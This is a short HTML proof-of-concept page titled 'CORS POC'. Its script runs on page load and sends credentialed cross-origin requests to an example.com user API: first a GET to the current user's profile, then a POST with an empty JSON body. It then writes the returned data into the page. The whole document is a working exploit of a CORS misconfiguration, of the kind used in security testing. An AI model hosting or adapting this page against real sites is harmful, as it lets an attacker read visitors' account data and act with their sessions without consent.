<!DOCTYPE html>
<html>
        <head>
                <title>CORS POC</title>
        </head>
        <body>
                <h1>CORS POC</h>
                <script>
                function cors(){
                    var xhr = new XMLHttpRequest();
                    xhr.onloadend = function() {
                        if (this.status == 200){
                            setTimeout(cors2,500);
                        }

                    }
                    xhr.open("GET","http://example.com/api/v0/users/me",true);
                    xhr.withCredentials = true;
                    xhr.send();
                }

                function cors2(){
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST","http://example.com/api/v0/users/",true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.withCredentials = true;
                    xhr.onloadend = function() {
                        if (this.status == 200){
                            document.write(this.responseText)
                        }

                    }
                    xhr.send("{}");
                }

                setTimeout(cors,500);
                </script>
        </body>
</html>
